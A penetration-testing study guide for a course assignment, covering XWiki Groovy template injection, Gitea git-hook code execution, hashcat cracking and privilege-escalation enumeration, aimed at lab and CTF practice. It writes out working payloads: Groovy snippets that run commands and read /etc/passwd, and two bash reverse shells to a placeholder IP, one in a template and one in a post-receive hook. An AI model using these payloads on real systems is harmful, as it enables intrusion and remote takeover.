# How to Complete the Assignment - Learning Guide
## If You Had Another Day to Learn and Complete It

## 📚 Learning Path (Full Day)

### Morning: Deep Dive into Exploitation Techniques (4 hours)

#### Hour 1-2: XWiki Template Injection Mastery

**What to Learn:**
1. **XWiki Architecture**
   - How XWiki works
   - Template system
   - Groovy scripting
   - Velocity templates

**Resources:**
- XWiki Documentation: https://www.xwiki.org/xwiki/bin/view/Documentation/
- XWiki Security: https://jira.xwiki.org/browse/XWIKI
- Template Injection Guide: Search "XWiki template injection"

**Practice:**
```bash
# Set up local XWiki (if possible)
# Or use TryHackMe XWiki room
# Practice template injection
```

**Key Commands to Master:**
```groovy
# Basic command execution
{{groovy}}
def proc = 'whoami'.execute()
proc.waitFor()
println proc.text
{{/groovy}}

# File reading
{{groovy}}
def file = new File('/etc/passwd')
println file.text
{{/groovy}}

# Reverse shell
{{groovy}}
def proc = 'bash -c "bash -i >& /dev/tcp/IP/4444 0>&1"'.execute()
proc.waitFor()
{{/groovy}}
```

#### Hour 3-4: Gitea Git Hooks RCE

**What to Learn:**
1. **Git Hooks**
   - How Git hooks work
   - Post-receive hooks
   - Pre-receive hooks
   - Hook execution context

2. **Gitea Architecture**
   - How Gitea handles hooks
   - Repository structure
   - Hook permissions

**Resources:**
- Git Hooks Documentation: https://git-scm.com/book/en/v2/Customizing-Git-Git-Hooks
- Gitea Security: https://github.com/go-gitea/gitea/security/advisories
- Gitea Hooks: Search "Gitea git hooks RCE"

**Practice Steps:**
```bash
# 1. Set up local Gitea (if possible)
# 2. Create repository
# 3. Clone repository
# 4. Create hook
# 5. Test hook execution
```

**Key Commands:**
```bash
# Create post-receive hook
mkdir -p .git/hooks
cat > .git/hooks/post-receive << 'EOF'
#!/bin/bash
bash -i >& /dev/tcp/IP/4444 0>&1
EOF
chmod +x .git/hooks/post-receive

# Commit and push
git add .git/hooks/post-receive
git commit -m "Add hook"
git push
```

---

### Afternoon: Advanced Techniques (4 hours)

#### Hour 5-6: Hash Extraction & Cracking

**What to Learn:**
1. **Password Hash Formats**
   - bcrypt
   - SHA-256/512
   - NTLM
   - How to identify formats

2. **Hash Cracking Tools**
   - hashcat
   - John the Ripper
   - Online tools

**Practice:**
```bash
# Identify hash format
hash-identifier

# Crack bcrypt
hashcat -m 3200 hash.txt rockyou.txt

# Crack SHA-256
hashcat -m 1400 hash.txt rockyou.txt

# Show results
hashcat -m 3200 hash.txt --show
```

**Resources:**
- Hashcat Wiki: https://hashcat.net/wiki/
- Hash Examples: https://hashcat.net/wiki/doku.php?id=example_hashes

#### Hour 7-8: Privilege Escalation

**What to Learn:**
1. **Linux Privilege Escalation**
   - SUID binaries
   - Sudo misconfigurations
   - Kernel exploits
   - Cron jobs

2. **Windows Privilege Escalation**
   - SeImpersonatePrivilege
   - Unquoted service paths
   - DLL hijacking
   - Token impersonation

**Practice:**
```bash
# Linux enumeration
find / -perm -4000 2>/dev/null
sudo -l
cat /etc/crontab
uname -a

# Windows enumeration
whoami /priv
systeminfo
net user
net localgroup administrators
```

**Resources:**
- Linux PrivEsc: https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation.md
- Windows PrivEsc: https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md

---

### Evening: Practice & Documentation (4 hours)

#### Hour 9-10: Hands-On Practice

**Practice on:**
1. **TryHackMe Rooms**
   - XWiki room (if available)
   - Gitea room (if available)
   - General penetration testing rooms

2. **HackTheBox Machines**
   - Retired machines with similar services
   - Practice template injection
   - Practice Git hooks

**What to Practice:**
- Template injection from scratch
- Git hooks setup
- Hash cracking
- Privilege escalation

#### Hour 11-12: Complete Your Assignment

**Final Steps:**
1. **Re-run Exploitation**
   - Apply learned techniques
   - Document successful attempts
   - Screenshot everything

2. **Complete Report**
   - Add exploitation sections
   - Add privilege escalation
   - Complete appendices

3. **Review & Polish**
   - Check all sections
   - Verify screenshots
   - Proofread

---

## 🎓 Learning Resources

### Online Courses:
1. **TryHackMe**
   - Web Fundamentals
   - Linux Fundamentals
   - Privilege Escalation paths

2. **HackTheBox Academy**
   - Penetration Testing modules
   - Web Application Security

3. **PortSwigger Web Security Academy**
   - Template injection
   - Server-side vulnerabilities

### YouTube Channels:
1. **IppSec** - HTB walkthroughs
2. **0xdf** - Detailed writeups
3. **John Hammond** - CTF solutions

### Books:
1. "The Web Application Hacker's Handbook"
2. "Metasploit: The Penetration Tester's Guide"
3. "Black Hat Python"

### Practice Platforms:
1. **TryHackMe** - Guided learning
2. **HackTheBox** - Realistic scenarios
3. **PentesterLab** - Web app security
4. **DVWA** - Local practice

---

## 📋 Step-by-Step Learning Plan

### Day 1: Foundation (8 hours)
- Morning: XWiki template injection
- Afternoon: Gitea Git hooks
- Evening: Practice on TryHackMe

### Day 2: Advanced (8 hours)
- Morning: Hash cracking & extraction
- Afternoon: Privilege escalation
- Evening: Complete assignment

---

## 🔧 Tools to Master

### Essential Tools:
1. **Nmap** - Port scanning
2. **curl** - Web requests
3. **hashcat** - Hash cracking
4. **searchsploit** - Exploit search
5. **Burp Suite** - Web proxy
6. **Metasploit** - Exploitation framework

### Practice Commands:
```bash
# Nmap
nmap -sC -sV target
nmap -p- --min-rate 1000 target

# curl
curl -X POST url -d "data"
curl -b cookies.txt url

# hashcat
hashcat -m 3200 hash.txt wordlist.txt
hashcat -m 1400 hash.txt wordlist.txt

# searchsploit
searchsploit service version
searchsploit -m exploit_id
```

---

## 💡 Key Concepts to Understand

### 1. Template Injection
- **What it is:** Code execution via templates
- **Why it works:** Templates execute code
- **How to exploit:** Inject malicious code
- **How to prevent:** Input validation

### 2. Git Hooks
- **What they are:** Scripts that run on Git events
- **Why they're dangerous:** Execute with user permissions
- **How to exploit:** Create malicious hook
- **How to prevent:** Restrict hook creation

### 3. Privilege Escalation
- **What it is:** Gaining higher privileges
- **Why it's needed:** Initial access often limited
- **How to do it:** Exploit misconfigurations
- **How to prevent:** Proper security configuration

---

## 🎯 Practice Scenarios

### Scenario 1: XWiki Template Injection
1. Set up XWiki locally
2. Create page with template
3. Inject Groovy code
4. Execute commands
5. Get reverse shell

### Scenario 2: Gitea Git Hooks
1. Set up Gitea locally
2. Create repository
3. Set up hook
4. Trigger hook
5. Get reverse shell

### Scenario 3: Hash Cracking
1. Extract hash from system
2. Identify hash format
3. Choose wordlist
4. Crack hash
5. Use credentials

---

## 📝 Documentation Template

### For Each System:
1. **Reconnaissance**
   - Commands used
   - Results
   - Screenshots

2. **Vulnerability Analysis**
   - Vulnerabilities found
   - CVSS scores
   - Exploitability

3. **Exploitation**
   - Steps taken
   - Commands used
   - Results
   - Screenshots

4. **Post-Exploitation**
   - Commands run
   - Information gathered
   - Flags found

---

## ✅ Learning Checklist

### XWiki:
- [ ] Understand template system
- [ ] Practice Groovy injection
- [ ] Practice Velocity injection
- [ ] Get reverse shell working
- [ ] Document process

### Gitea:
- [ ] Understand Git hooks
- [ ] Practice hook creation
- [ ] Trigger hook execution
- [ ] Get reverse shell working
- [ ] Document process

### General:
- [ ] Master hash cracking
- [ ] Learn privilege escalation
- [ ] Practice on platforms
- [ ] Document everything
- [ ] Write professional report

---

## 🚀 Quick Start Learning (If Limited Time)

### 2-Hour Crash Course:
1. **30 min:** Watch XWiki template injection video
2. **30 min:** Practice on TryHackMe room
3. **30 min:** Watch Gitea Git hooks video
4. **30 min:** Practice Git hooks locally

### 4-Hour Intensive:
1. **1 hour:** XWiki deep dive
2. **1 hour:** Gitea deep dive
3. **1 hour:** Hash cracking practice
4. **1 hour:** Apply to your systems

---

## 💬 What to Tell Your Friends

**"I'm learning:**
- Template injection techniques for XWiki
- Git hooks exploitation for Gitea
- Hash cracking methods
- Privilege escalation techniques

**I'm practicing on:**
- TryHackMe rooms
- Local lab environments
- Retired HTB machines

**I'm documenting:**
- Every command I run
- Every technique I learn
- Every success and failure

**My goal:**
- Complete full exploitation
- Document everything professionally
- Learn the techniques properly"

---

## 🎓 Final Advice

1. **Practice Makes Perfect**
   - Don't just read, practice
   - Set up local environments
   - Try techniques yourself

2. **Document Everything**
   - Write down what works
   - Note what doesn't work
   - Screenshot everything

3. **Learn the Why**
   - Don't just copy commands
   - Understand the concepts
   - Know why techniques work

4. **Be Patient**
   - Exploitation takes time
   - Some techniques need practice
   - Don't give up

5. **Ask for Help**
   - Join communities
   - Watch walkthroughs
   - Learn from others

---

**Remember:** Learning penetration testing is a journey. Every attempt teaches you something. Even if you don't complete full exploitation, the learning process is valuable!

